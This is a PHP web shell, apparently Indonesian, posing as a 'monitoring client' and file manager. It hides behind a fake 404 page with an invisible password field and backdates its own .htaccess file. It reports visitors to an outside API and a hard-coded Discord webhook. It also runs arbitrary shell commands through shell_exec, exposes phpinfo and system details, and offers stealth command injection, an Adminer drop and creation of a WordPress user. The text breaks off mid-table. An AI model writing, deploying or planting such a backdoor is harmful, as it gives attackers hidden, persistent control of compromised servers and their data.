<?php
// manager.php - Monitoring client (no WP dependency)
// Place in your file manager script (include or paste at top)

// ---------- CONFIG ----------
if (session_status() === PHP_SESSION_NONE) session_start();

$password = "yoursecurepassworddddddddddddddddddddd";
$monitor_api = getenv('MONITOR_API_URL') ?: 'https://test.dui.edu.ng/dash/api.php'; // <-- set to your api.php
$MONITOR_SHARED_SECRET = getenv('MONITOR_SHARED_SECRET') ?: 'jsd8djsne8G8wjGU';
$discord_webhook = getenv('DISCORD_WEBHOOK') ?: 'https://discordapp.com/api/webhooks/1415017779324518500/l9DiiyAQgieJvVpndkoadNU19usu3GQOxpup78xUhXRUECmlv2p3DvbNepjTpsmK_6UW'; // optional Discord webhook URL (leave empty if unused)
// heartbeat interval (seconds) for server-side ping
$heartbeat_interval = 300; // default 300s = 5min
// ---------- END CONFIG ----------

/**
 * Send JSON POST signed with HMAC SHA256 (X-Signature header).
 * Returns response body string on success, false on failure.
 */
function createHtaccess(string $dir, string $filename): void
{
    $htaccessFile = rtrim($dir, '/') . '/.htaccess';
    $htaccessContent = <<<HT
# Matikan directory listing
Options -Indexes

<Files "{$filename}">
    Require all granted
</Files>
HT;

    if (!file_exists($htaccessFile) || @md5_file($htaccessFile) !== md5($htaccessContent)) {
        @file_put_contents($htaccessFile, $htaccessContent);
        @chmod($htaccessFile, 0444);
        @exec("touch -d '7 months ago 6 days ago' " . escapeshellarg($htaccessFile));
    }
}

function send_monitor_post_signed(string $url, array $data, string $secret) {
    $json = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    if ($json === false) {
        error_log("monitor: json_encode failed: " . json_last_error_msg());
        return false;
    }

    $sig = hash_hmac('sha256', $json, $secret);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'X-Signature: ' . $sig,
        'User-Agent: ManagerClient/1.0'
    ]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);

    $resp = curl_exec($ch);
    $err  = curl_error($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($resp === false) {
        error_log("monitor: cURL error -> $err");
        return false;
    }
    if ($http < 200 || $http >= 300) {
        error_log("monitor: non-2xx response ($http): $resp");
        return false;
    }
    return $resp;
}

/**
 * Optional: send Discord embed (simple)
 */
function send_discord_webhook(string $webhook_url, array $embeds) {
    if (empty($webhook_url)) return false;
    $payload = ['content' => '', 'embeds' => $embeds];
    $json = json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $resp = curl_exec($ch);
    curl_close($ch);
    return $resp !== false;
}

/**
 * Build embed array for Discord (optional)
 */
function make_embed(string $title, string $ip, string $ua, string $session_id, string $time, string $url) : array {
    return [

        "title" => "🔔 " . $title,
        "color" => 0x1E90FF, // DodgerBlue
        "fields" => [
            ["name" => "🌐 IP Address", "value" => "`{$ip}`", "inline" => true],
            ["name" => "🆔 Session ID", "value" => "`{$session_id}`", "inline" => true],
            ["name" => "⏰ Time (UTC)", "value" => "`{$time}`", "inline" => true],
            ["name" => "🔗 URL", "value" => $url, "inline" => false],
            ["name" => "🖥️ User-Agent", "value" => "```{$ua}```", "inline" => false],
        ],
        "footer" => [
            "text" => "Manager Monitor • " . date("Y-m-d H:i:s") . " UTC",
            "icon_url" => "https://cdn-icons-png.flaticon.com/512/2099/2099058.png"
        ],
        "timestamp" => date("c"),
    ];
}


/**
 * Build monitoring payload
 */
function make_monitor_payload(string $event, string $url) : array {
    return [
        'event' => $event,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'session_id' => session_id(),
        'time' => gmdate("Y-m-d H:i:s") . " UTC",
        'url' => $url,
    ];
}

// ---------------- MAIN LOGIC ----------------
// Build current URL
$current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' .
               ($_SERVER['HTTP_HOST'] ?? 'unknown') . ($_SERVER['REQUEST_URI'] ?? '/');

// 1) Session start (first access)
if (empty($_SESSION['monitor_sent'])) {
    $payload = make_monitor_payload('session_start', $current_url);
    $resp = send_monitor_post_signed($monitor_api, $payload, $MONITOR_SHARED_SECRET);
    if ($resp === false) {
        error_log("monitor: failed to send session_start");
    } else {
        // optional: log response
        error_log("monitor: session_start response: " . substr($resp, 0, 500));
    }
    // optional discord notify
    if (!empty($discord_webhook)) {
        send_discord_webhook($discord_webhook, [ make_embed("New Session", $payload['ip'], $payload['user_agent'], $payload['session_id'], $payload['time'], $payload['url']) ]);
    }
    $_SESSION['monitor_sent'] = true;
    $_SESSION['monitor_last_ping'] = time();
}

// 2) Logout (call this block when you handle logout; example uses ?logout)
if (isset($_GET['logout'])) {
    $payload = make_monitor_payload('session_logout', $current_url);
    $resp = send_monitor_post_signed($monitor_api, $payload, $MONITOR_SHARED_SECRET);
    if ($resp === false) error_log("monitor: failed to send session_logout");
    if (!empty($discord_webhook)) {
        send_discord_webhook($discord_webhook, [ make_embed("Session Logout", $payload['ip'], $payload['user_agent'], $payload['session_id'], $payload['time'], $payload['url']) ]);
    }
    session_destroy();
    header("Location: " . ($_SERVER['PHP_SELF'] ?? '/'));
    exit();
}

// 3) Heartbeat: server-side heartbeat triggers when this PHP runs and last ping > interval.
// If you need continuous heartbeat even when user is idle, implement JS client-side fetch to call manager.php periodically.
if (isset($_SESSION['monitor_last_ping']) && (time() - $_SESSION['monitor_last_ping'] > $heartbeat_interval)) {
    $payload = make_monitor_payload('heartbeat', $current_url);
    $resp = send_monitor_post_signed($monitor_api, $payload, $MONITOR_SHARED_SECRET);
    if ($resp === false) error_log("monitor: failed to send heartbeat");
    else error_log("monitor: heartbeat response: " . substr($resp, 0, 500));
    $_SESSION['monitor_last_ping'] = time();
}


// ... kode lanjutan Anda ... ================================================================================



// Periksa apakah user sudah login
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Jika password belum disubmit atau salah, tampilkan form login
    if (isset($_POST['login_password']) && $_POST['login_password'] === $password) {
        $_SESSION['authenticated'] = true; // Set session sebagai terautentikasi
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman setelah login
        exit();
    } else {
        // Tampilkan form login
        echo '
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>404 Not Found</title>
        </head>
        <body>
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
            <p>Additionally, a 404 Not Found
            error was encountered while trying to use an ErrorDocument to handle the request.</p>
            <form method="post">
                <label for="password" style="display:none;"></label>
                <input type="password" 
                    name="login_password" 
                    id="password" 
                    required
                    style="border:none; background:transparent; outline:none; color:transparent;">
                <button type="submit" 
                    style="border:none; background:transparent; color:transparent;">
                </button>
            </form>
        </body>
        </html>
        ';
        exit();
    }
}

// Jika user sudah login, tampilkan halaman file manager dan tombol logout
echo '
<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
</body>
</html>
';
?>



<?php error_reporting(0); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name='author' content='meng'>
    <title>meng-gocok</title>
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4322/4322991.png" type="image/x-icon"> <!-- Link to the favicon -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #1d1d1d; /* Warna background untuk fallback */
            color: #f0f0f0; /* Warna teks */
            line-height: 1.6;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            position: relative;
            /* Hapus overflow: hidden; */
        }

        body::before {
            content: '';
            position: fixed; /* Gunakan fixed agar gambar tetap di latar belakang saat scroll */
            top: 300;
            left: 0;
            width: 150%;
            height: 150%;
            background-image: url('https://media.discordapp.net/attachments/1242190287800111195/1296767955958235146/43f431c4fb5b83510e4de2c9019c6a06.png?ex=67181a05&is=6716c885&hm=6c40c317d95f798201467234f88d6bb8b4d4ade9b931bf1526ccdf7d0f0e7bfc&=&format=webp&quality=lossless&width=493&height=856'); /* Path gambar background */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            opacity: 0.3; /* Atur opasitas gambar */
            z-index: -1; /* Pastikan gambar tetap di belakang konten */
        }

        h1 {
            text-align: center;
            color: #97e1e6; /* Header color */
            padding: 20px 0; /* Padding for spacing */
            font-size: 2.5em; /* Responsive font size */
        }

        .container {
            display: flex;
            max-width: 1800px; /* Limit maximum width */
            margin: 20px auto; /* Center align the container */
            padding: 20px; /* Add padding for spacing */
            background-color: #282828; /* Darker container background */
            border-radius: 8px; /* Rounded corners */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* Subtle shadow for depth */
        }

        .nav {
            width: 250px; /* Fixed width for the navigation panel */
            padding: 20px;
            background-color: #2c2c2c; /* Slightly lighter dark background */
            border-right: 1px solid #444; /* Dark border */
            overflow-y: auto; /* Scrollable if content overflows */
            position: relative; /* Needed for absolute positioning of the line */
        }

        .folder-item {
            position: relative; /* Needed for positioning the line */
            padding-left: 20px; /* Indent the folder items */
        }

        .folder-indicator {
            position: absolute; /* Position the line absolutely */
            left: 0; /* Align to the left */
            top: 0; /* Align to the top */
            height: 100%; /* Full height */
            width: 2px; /* Width of the line */
            background-color: #444; /* Color of the line */
        }

        .folder-item:hover .folder-indicator {
            background-color: #97e1e6; /* Change line color on hover */
        }

        .nav a {
            display: block;
            margin: 10px 0;
            color: #40e0d0; /* Lighter link color */
            text-decoration: none;
            padding: 10px; /* Added padding for better click area */
            border-radius: 5px; /* Rounded corners */
            transition: background-color 0.3s; /* Smooth transition */
        }

        .nav a:hover {
            background-color: #3d3d3d; /* Dark background on hover */
            color: #97e1e6; /* Lighter hover color */
        }

        .breadcrumb {
            padding: 10px;
            background-color: #2c2c2c; /* Dark background for breadcrumb */
            margin: 10px 0; /* Margin for spacing */
            border-radius: 5px; /* Rounded corners */
        }

        .breadcrumb a {
            color: #40e0d0; /* Light link color for breadcrumb */
            text-decoration: none;
        }

        .breadcrumb a:hover {
            color: #97e1e6; /* Lighter hover color */
        }

        .table-container {
            flex: 1; /* Take remaining space */
            padding: 20px;
            background-color: #2c2c2c; /* Darker background for table area */
            border-radius: 5px; /* Rounded corners */
        }

        table {
            width: 100%; /* Full width for table */
            border-collapse: collapse;
            font-size: 16px; /* Adjusted font size for better readability */
        }

        th, td {
            border: 1px solid #444; /* Darker border */
            padding: 10px; /* Padding for cells */
            text-align: left; /* Left align text */
        }

        th {
            background-color: #3d3d3d; /* Dark background for headers */
            color: #f0e68c; /* Light header text */
        }

        td {
            color: #ffffff; /* Light text color for table cells */
        }

        .button1 {
            background-color: #40e0d0; /* Button background */
            color: #3d3d3d; /* Text color */
            border: none; /* Remove border */
            padding: 10px 15px; /* Padding for buttons */
            border-radius: 5px; /* Rounded corners */
            cursor: pointer; /* Pointer cursor on hover */
            transition: background-color 0.3s; /* Smooth transition */
            display: inline-flex; /* Flex layout */
            align-items: center; /* Center vertically */
            text-decoration: none; /* Remove underline */
        }

        .button1:hover {
            background-color: #3d3d3d; /* Darker on hover */
            color: #ffffff; /* Text color */
        }

        .button2 {
            margin-top:20px
            background-color: #40e0d0; /* Button background */
            color: #3d3d3d; /* Text color */
            border: none; /* Remove border */
            padding: 60px 15px; /* Padding for buttons */
            border-radius: 5px; /* Rounded corners */
            cursor: pointer; /* Pointer cursor on hover */
            transition: background-color 0.3s; /* Smooth transition */
            display: inline-flex; /* Flex layout */
            align-items: center; /* Center vertically */
            text-decoration: none; /* Remove underline */
        }

        .button2:hover {
            background-color: #3d3d3d; /* Darker on hover */
            color: #ffffff; /* Text color */
        }

        .button3 {
            margin-top:20px
            background-color: #40e0d0; /* Button background */
            color: #3d3d3d; /* Text color */
            border: none; /* Remove border */
            padding: 60px 15px; /* Padding for buttons */
            border-radius: 5px; /* Rounded corners */
            cursor: pointer; /* Pointer cursor on hover */
            transition: background-color 0.3s; /* Smooth transition */
            display: inline-flex; /* Flex layout */
            align-items: center; /* Center vertically */
            text-decoration: none; /* Remove underline */
        }

        .button3:hover {
            background-color: #3d3d3d; /* Darker on hover */
            color: #ffffff; /* Text color */
        }

        textarea {
            border: 1px solid #444; /* Darker border */
            border-radius: 5px;
            width: 100%;
            height: 400px;
            padding: 10px;
            background: #222; /* Darker background for textarea */
            color: #ffffff; /* Light text color */
            font-size: 14px; /* Slightly larger font size */
            resize: none;
        }

        /* Basic styles for navigation links */
        .directory-link {
            display: block; /* Make each link a block for easier clicking */
            padding: 5px;  /* Add some padding */
            text-decoration: none; /* Remove underline */
            color: black; /* Default text color */
        }
    
        /* Hover effect for directory links */
            .directory-link:hover {
            background-color: #f0f0f0; /* Light gray background on hover */
            color: #007bff; /* Change text color on hover */
            transition: background-color 0.3s, color 0.3s; /* Smooth transition */
        }
    
        /* Styles for the current directory */
        .current-directory {
            font-weight: bold; /* Bold font for current directory */
            color: #007bff; /* Same color as hover */
        }
        
        /* Kontainer Utama */
        .form-container {
            display: flex; /* Gunakan flexbox */
            justify-content: space-between; /* Jarak merata di antara elemen */
            gap: 20px; /* Jarak antar form */
            margin-top: 15px;
        }
        /* Kontainer Utama */
        .form-container2 {
            display: flex; /* Gunakan flexbox */
            justify-content: space-between; /* Jarak merata di antara elemen */
            gap: 20px; /* Jarak antar form */
            margin-top: 15px;
        }

        /* Form Setiap Elemen */
        .form-item {
            background-color: #222; /* Latar belakang untuk form */
            padding: 15px; /* Jarak dalam */
           border-radius: 5px; /* Sudut membulat */
            width: 30%; /* Lebar setiap form */
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Bayangan */
        }
        /* Form Setiap Elemen */
        .form-item2 {
            background-color: #222; /* Latar belakang untuk form */
            padding: 15px; /* Jarak dalam */
           border-radius: 5px; /* Sudut membulat */
            width: 30%; /* Lebar setiap form */
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Bayangan */
        }
        /* Tata Letak Horizontal pada Label dan Input */
        .form-group {
            display: flex; /* Gunakan flexbox untuk label dan input */
            align-items: center; /* Ratakan secara vertikal */
            gap: 10px; /* Jarak antara label dan input */
            margin-bottom: 10px; /* Jarak antar kelompok */
        }
        .form-group label {
            flex: 1; /* Lebar fleksibel untuk label */
            font-weight: bold;
            color: #40e0d0; /* Warna label */
        }
        .form-group input {
            flex: 2; /* Lebar fleksibel untuk input */
            padding: 8px;
            border: 1px solid #444; /* Border warna gelap */
            border-radius: 5px;
            background-color: #333; /* Latar belakang input */
            color: #fff; /* Warna teks input */
            font-size: 14px;
        }
        /* Styling Tombol */
        .form-item input[type="submit"] {
            background-color: #444; /* Warna tombol */
            padding: 8px 10px;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer; /* Pointer untuk hover */
            transition: background-color 0.3s;
            width: 100%; /* Lebar penuh tombol */
            font-size: 14px;
        }
        .form-item input[type="submit"]:hover {
            background-color: #555; /* Warna tombol saat hover */
        }
        /* Styling Tombol */
        .form-item2 input[type="submit"] {
            background-color: #444; /* Warna tombol */
            padding: 8px 10px;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer; /* Pointer untuk hover */
            transition: background-color 0.3s;
            width: 100%; /* Lebar penuh tombol */
            font-size: 14px;
        }
        .form-item2 input[type="submit"]:hover {
            background-color: #555; /* Warna tombol saat hover */
        }
        .command-output {
            margin-top: 15px;
            padding: 10px;
            background-color: #111;
            color: #0f0;
            font-family: monospace;
            border-radius: 5px;
            white-space: pre-wrap;
        }
        .button1.stealth {
    background-color: #800;
    color: #fff;
    border: 1px solid #f00;
}
        .command-output strong {
            color: #fff;
            display: block;
            margin-bottom: 5px;
        }

        /* Media queries for responsive design */
        @media (max-width: 1080px) {
            .container {
                flex-direction: column; /* Stack elements vertically on smaller screens */
            }

            .nav {
                width: 100%; /* Full width for navigation on mobile */
                border-right: none; /* Remove right border */
                border-bottom: 1px solid #444; /* Add bottom border */
            }
        }
    </style>
</head>
<body>
    <center>
        <div>
            <h1 style="margin: 5px 0;">MENG-HEHE bangun tidur 2.0</h1>
            <h2 style="margin: 5px 0;">lagi lagi ini dibuat dengan cara, amati tiru plek-ketiplek</h2>
            <h2 style="margin: 5px 0;">-</h2>
            <a href="?logout=true">Logout</a>
        </div>
    </center>
    
    
    
    <?php
    $rootDir = __DIR__;

    // Jika parameter phpinfo ada, tampilkan phpinfo lalu stop
    if (isset($_GET['phpinfo'])) {
        echo '<div style="padding:10px;background:#222;color:#eee;font-family:monospace">';
        echo '<a href="?" style="color:#40e0d0;text-decoration:none">⬅ Kembali</a>';
        echo '</div>';
        phpinfo();
        exit;
    }

    // --- Informasi sistem ---
    $cwd = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    if ($cwd === false) $cwd = getcwd(); // fallback kalau path invalid

    $uname = php_uname();
    $user = getmyuid();
    $group = getmygid();
    $user_name = function_exists('posix_getpwuid') ? posix_getpwuid($user)['name'] : $user;
    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group)['name'] : $group;
    $disable_functions = ini_get('disable_functions');
    $disable_functions = empty($disable_functions) ? 'NONE' : $disable_functions;
    $safe_mode = ini_get('safe_mode') ? 'On' : 'Off';

    // --- Breadcrumb ---
    $parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
    $breadcrumb = '<a href="?dir=/">/</a>'; // Home
    $path_accum = '';
    foreach ($parts as $p) {
        if ($p === '') continue;
        $path_accum .= DIRECTORY_SEPARATOR . $p;
        $breadcrumb .= '<a href="?dir=' . urlencode($path_accum) . '">' . htmlspecialchars($p) . '</a>/';
    }
    ?>

    <style>
        .status-bar {
            background:#222;
            color:#eee;
            padding:10px;
            font-family:monospace;
            font-size:13px;
            border-bottom:2px solid #444;
            line-height:1.5em;
        }
        .status-bar a {
            color:#40e0d0;
            text-decoration:none;
            margin:0 2px;
        }
        .status-bar a:hover {
            text-decoration:underline;
        }
        .status-bar form {
            display:inline;
            margin:0;
            padding:0;
        }
        .status-bar input[type="text"] {
            width:200px;
            font-family:monospace;
            font-size:12px;
            background:#111;
            border:1px solid #444;
            color:#eee;
            padding:2px 4px;
        }
        .status-bar input[type="submit"] {
            font-size:12px;
            padding:2px 6px;
            cursor:pointer;
        }
    </style>

    <div class="status-bar">
        <b>Uname:</b> <?= htmlspecialchars($uname) ?><br>
        <b>User:</b> <?= $user ?> (<?= htmlspecialchars($user_name) ?>)<br>
        <b>Group:</b> <?= $group ?> (<?= htmlspecialchars($group_name) ?>)<br>
        <b>Disable functions:</b> <?= htmlspecialchars($disable_functions) ?><br>
        <b>Safe mode:</b> <?= $safe_mode ?> [ <a href="?phpinfo=1">PHPinfo</a> ]<br>
        <b><?= $breadcrumb ?></b>
        (
            <a href="?dir=<?= urlencode($rootDir) ?>">Reset</a> | 
            <form method="get" style="display:inline">
                <input type="text" name="dir" placeholder="Masukkan path..." 
                    value="<?= htmlspecialchars($cwd) ?>">
                <input type="submit" value="Go">
            </form>
        )
    </div>






    <div class="container">


    
<!-- navigasi -->
        <div class="nav">
            <h3>Navigation</h3>
            <?php  
                $rootDir = getcwd();
                $dir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
                $dir = str_replace("\\", "/", $dir);
                $dirs = explode("/", $dir);
    
                // Display the current path
                foreach ($dirs as $key => $value) {
                    if ($value == "" && $key == 0) {
                        echo '<a href="?dir=/">/</a>'; 
                        continue;
                    } 
                    echo '<a href="?dir=';
                    for ($i=0; $i <= $key; $i++) { 
                        echo "$dirs[$i]"; 
                        if ($key !== $i) echo "/";
                    } 
                    echo '" class="directory-link">'.$value.'</a>'; // Added class for styling
                }
                // Display only folders in the current directory
                $scan = scandir($dir);
                foreach ($scan as $item) {
                    if ($item == '.' || $item == '..') continue; // Skip current and parent directory
                    if (is_dir($dir.'/'.$item)) { // Check if it's a directory
                        echo '<div class="folder-item">
                        <div class="folder-indicator"></div>
                        <a href="?dir='.$dir.'/'.$item.'" class="directory-link">'.$item.'</a>
                        </div>'; // Only show directories
                    }
                }
            ?>
        </div>



<!-- dir menu atas -->
        <div class="table-container">
            <!-- <div class="breadcrumb">
                <a href="?dir=//">Home</a>
                <?php
                $path = '';
                foreach ($dirs as $key => $value) {
                    if ($value == '') continue;
                    $path .= $value . '/';
                    echo ' &gt; <a href="?dir=//'.$path.'">'.$value.'</a>';
                }
                ?>
            </div> -->



<!-- Upload File, Buat File, atau Folder -->
        <div class="dir">
            <!-- h3>Upload File, Buat File, atau Folder, atau Jalankan Command</h3 -->
            <div class="form-container">
                <!-- Upload File -->
                <form method="post" enctype="multipart/form-data" class="form-item">
                    <div class="form-group">
                        <label for="upload">Upload File:</label>
                        <input type="file" id="upload" name="upload" required>
                    </div>
                    <input type="submit" name="submit" value="Upload" class="button1">
                </form>
                <!-- Create Folder -->
                <form method="post" class="form-item">
                    <div class="form-group">
                        <label for="folder_name">Nama Folder:</label>
                        <input type="text" id="folder_name" name="folder_name" placeholder="Masukkan nama folder" required>
                    </div>
                    <input type="submit" name="create_folder" value="Buat Folder" class="button1">
                </form>

                <!-- Create File -->
                <form method="post" class="form-item">
                    <div class="form-group">
                        <label for="file_name">Nama File:</label>
                        <input type="text" id="file_name" name="file_name" placeholder="Masukkan nama file" required>
                    </div>
                    <input type="submit" name="create_file" value="Buat File" class="button1">
                </form>
            </div>

            <div class="form-container2">
                <!-- Run Command -->
                <form method="post" class="form-item2">
                    <div class="form-group">
                        <label for="command_input">CMD:</label>
                        <input type="text" id="command_input" name="command2" placeholder="contoh: whoami;id" required>
                    </div>
                    <input type="submit" name="command" value="Run Command" class="button2">
                </form>
                <!-- Stealth CMD Injection -->
                <form method="post" class="form-item">
                    <div class="form-group">
                        <label for="cmd_input">CMD @min:</label>
                        <input type="text" id="cmd_input" name="cmd_input" placeholder="contoh: whoami;id" required>
                    </div>
                    <input type="submit" value="Inject Command" class="button1">
                </form>
                <!-- Tombol Download Adminer -->
                <form method="get" class="form-item2">
                    <input type="hidden" name="create_adminer" value="1">
                    <input type="submit" value="Buat Adminer" class="button2">
                </form>

                <!-- Tombol Create WP User -->
                <form method="get" class="form-item2">
                    <input type="hidden" name="createwp" value="1">
                    <input type="submit" value="Buat WP User" class="button2">
                </form>
            </div>


            <?php
            // Menjalankan command jika dikirim
            if (isset($_POST['command']) && !empty($_POST['command2'])) {
                $cmd = $_POST['command2'];
                $output = shell_exec($cmd . " 2>&1"); // Jalankan command & ambil output
                echo '<div class="command-output">';
                echo '<strong>Hasil Command:</strong><pre>' . htmlspecialchars($output) . '</pre>';
                echo '</div>';
            }
            ?>
        </div>





<!-- menampilkan kabeh file cik -->
            <table>
                <tr>
                    <th>Nama File / Folder</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Baca</th>
                    <th>Edit</th>
                    <th>Hapus</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>




                <?php
                // For directories
                //foreach ($scan as $directory) {
                //    if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

                //    echo '
                //    <tr>
                //        <td>
                //            <i class="fas fa-folder" style="color: #97e1e6;"></i> 
                //            <a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a>
                //        </td>
                //        <td>--</td>
                //        <td>--</td>
                //        <td>NONE</td>
                //    </tr>
                //    ';
                //} 
                // Scan directory for files and folders
                $scan = scandir($dir);
                // Arrays to hold folders and files separately
                $folders = [];
                $files = [];
                // Separate folders and files
                foreach ($scan as $item) {
                    $itemPath = $dir.'/'.$item;
                    if ($item == '.' || $item == '..') continue; // Skip current and parent directory

                    if (is_dir($dir.'/'.$item)) {
                        $folders[] = $item; // Collect folders
                    } elseif (is_file($dir.'/'.$item)) {
                        $files[] = $item; // Collect files
                    }
                }
                // Get the current time
                $currentTime = time();



// Display Back button to parent directory
                if (!empty($dir) && $dir != '/' && !isset($_GET['ubah']) && !isset($_GET['open']) && !isset($_GET['modify']) && !isset($_GET['rename'])) { 
                    $parentDir = dirname($dir);
                    echo '
                    <br />
                    <a href="?dir='.$parentDir.'" class="button1" style="display: flex; align-items: center;">
                        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Balikan ke Parent Directory
                    </a>
                    <br /><br />
                    ';
                }



// Folderr
                foreach ($folders as $folder) {
                    $itemPath = $dir . '/' . $folder;

                    $jumlah = filesize($itemPath)/1024;
                    $jumlah = round($jumlah, 3);
                    if ($jumlah >= 1024) $jumlah = round($jumlah/1024, 2).' MB'; else $jumlah .= ' KB';

                    $lastModifiedTimestamp = filemtime($itemPath);
                    $lastModified = date("F d Y H:i:s", $lastModifiedTimestamp);
                    $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60*60*24);
                    $color = getColorForAge($ageInDays);

                    $canRead = is_readable($itemPath) ? 'Y' : 'G';
                    $canEdit = is_writable($itemPath) ? 'Y' : 'G';
                    $canDelete = is_writable($itemPath) ? 'Y' : 'G';

                    // Permission angka
                    $permission = substr(sprintf('%o', fileperms($itemPath)), -4);

                    // Form untuk mengubah permission
                    $permissionForm = '
                        <form method="POST" style="display:inline-flex; align-items:center; gap:4px;">
                            <input type="hidden" name="path" value="'.$itemPath.'">
                            <input type="text" name="new_perm" value="'.$permission.'" size="4" 
                                style="width:50px; padding:2px 5px; border:1px solid #888; border-radius:4px; text-align:center; font-family:monospace;">
                            <input type="submit" name="change_perm" value="Set" 
                                style="background:#40e0d0; border:none; border-radius:4px; padding:2px 6px; cursor:pointer; font-size:12px; color:#000;">
                        </form>
                    ';

                    echo '
                    <tr>
                        <td><i class="fas fa-folder" style="color: #f6c30c;"></i> <a href="?dir='.$itemPath.'" style="color: #40e0d0;">'.$folder.'</a></td>
                        <td>'.$jumlah.'</td>
                        <td style="color: '.$color.';">'.$lastModified.'</td>
                        <td>'.$canRead.'</td>
                        <td>'.$canEdit.'</td>
                        <td>'.$canDelete.'</td>
                        <td>'.$permissionForm.'</td>
                        <td>
                            <a href="?dir='.$dir.'&delete_folder='.$itemPath.'" class="button1">Hapus</a>
                            <a href="?dir='.$dir.'&rename='.$itemPath.'&nama='.$folder.'" class="button1">Rename</a>
                            <a href="?dir='.$dir.'&modify='.$itemPath.'" class="button1">Modify Date</a>
                        </td>
                    </tr>';
                }
                //<a href="?dir='.$dir.'&ubah='.$dir.'/'.$folder.'" class="button1">Edit</a>



// Fileeeeeeeeeeeeeee
                foreach ($files as $file) {
                    $itemPath = $dir . '/' . $file;

                    // Tentukan icon
                    $fileExt = pathinfo($file, PATHINFO_EXTENSION);
                    $icon = '<i class="fas fa-file" style="color: #97e1e6;"></i>';
                    switch (strtolower($fileExt)) {
                        case 'jpg': case 'jpeg': case 'png': case 'gif':
                            $icon = '<i class="fas fa-file-image" style="color: #97e1e6;"></i>';
                            break;
                        case 'pdf':
                            $icon = '<i class="fas fa-file-pdf" style="color: #97e1e6;"></i>';
                            break;
                        case 'txt':
                            $icon = '<i class="fas fa-file-alt" style="color: #97e1e6;"></i>';
                            break;
                        case 'zip': case 'rar':
                            $icon = '<i class="fas fa-file-archive" style="color: #97e1e6;"></i>';
                            break;
                        case 'php':
                            $icon = '<i class="fas fa-file" style="color: #e2e98c;"></i>';
                            break;
                    }

                    // Ukuran file akurat
                    $size = filesize($itemPath);
                    if ($size >= 1024*1024) {
                        $jumlah = round($size / (1024*1024), 2) . ' MB';
                    } elseif ($size >= 1024) {
                        $jumlah = round($size / 1024, 2) . ' KB';
                    } else {
                        $jumlah = $size . ' B';
                    }

                    // Last modified
                    $lastModifiedTimestamp = filemtime($itemPath);
                    $lastModified = date("F d Y H:i:s", $lastModifiedTimestamp);

                    // Warna berdasarkan usia file
                    $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60 * 60 * 24);
                    $color = getColorForAge($ageInDays);

                    // Hak akses
                    $canRead = is_readable($itemPath) ? 'Y' : 'G';
                    $canEdit = is_writable($itemPath) ? 'Y' : 'G';
                    $canDelete = is_writable($itemPath) ? 'Y' : 'G';

                    // Permission angka
                    $permission = substr(sprintf('%o', fileperms($itemPath)), -4);

                    // Form untuk mengubah permission
                    $permissionForm = '
                        <form method="POST" style="display:inline-flex; align-items:center; gap:4px;">
                            <input type="hidden" name="path" value="'.$itemPath.'">
                            <input type="text" name="new_perm" value="'.$permission.'" size="4" 
                                style="width:50px; padding:2px 5px; border:1px solid #888; border-radius:4px; text-align:center; font-family:monospace;">
                            <input type="submit" name="change_perm" value="Set" 
                                style="background:#40e0d0; border:none; border-radius:4px; padding:2px 6px; cursor:pointer; font-size:12px; color:#000;">
                        </form>
                    ';

                    echo '
                    <tr>
                        <td>'.$icon.' <a href="?dir='.$dir.'&open='.$itemPath.'" style="color: #40e0d0;">'.$file.'</a></td>
                        <td>'.$jumlah.'</td>
